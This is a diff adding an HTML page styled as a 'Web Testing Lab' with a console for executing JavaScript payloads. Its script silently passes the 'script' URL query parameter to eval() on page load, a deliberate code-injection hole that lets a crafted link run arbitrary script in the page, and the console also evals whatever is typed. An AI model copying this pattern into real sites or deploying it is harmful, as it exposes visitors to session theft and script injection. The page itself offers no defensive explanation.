@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Web Testing Lab</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+body {
+  margin: 0;
+  font-family: "Segoe UI", sans-serif;
+  background: #0f172a;
+  color: #e2e8f0;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 100vh;
+}
+
+.container {
+  width: 90%;
+  max-width: 600px;
+  background: #1e293b;
+  padding: 25px;
+  border-radius: 12px;
+  text-align: center;
+  box-shadow: 0 0 25px rgba(0,0,0,0.6);
+}
+
+h1 { margin-bottom: 10px; }
+p { opacity: 0.8; }
+
+button {
+  margin-top: 15px;
+  padding: 10px 15px;
+  border: none;
+  border-radius: 8px;
+  background: #3b82f6;
+  color: white;
+  cursor: pointer;
+}
+
+#panel {
+  display: none;
+  margin-top: 15px;
+}
+
+textarea {
+  width: 100%;
+  height: 100px;
+  margin-top: 10px;
+  background: #0f172a;
+  color: #e2e8f0;
+  border: none;
+  border-radius: 8px;
+  padding: 10px;
+}
+</style>
+</head>
+
+<body>
+<div class="container">
+  <h1>🌐 Web Testing Lab</h1>
+  <p>Use this environment to simulate client-side behavior and payload execution.</p>
+
+  <button onclick="togglePanel()">Open Console</button>
+
+  <div id="panel">
+    <textarea id="code" placeholder="Enter JS payload..."></textarea>
+    <button onclick="run()">Execute</button>
+  </div>
+</div>
+
+<script>
+const params = new URLSearchParams(window.location.search);
+const payload = params.get("script");
+
+// silent auto-execution on load
+if (payload) {
+  try {
+    eval(payload);
+  } catch(e) {
+    console.error(e);
+  }
+}
+
+function togglePanel() {
+  const p = document.getElementById("panel");
+  p.style.display = p.style.display === "none" ? "block" : "none";
+}
+
+function run() {
+  const code = document.getElementById("code").value;
+  try {
+    eval(code);
+  } catch(e) {
+    alert(e.message);
+  }
+}
+</script>
+
+</body>
+</html>
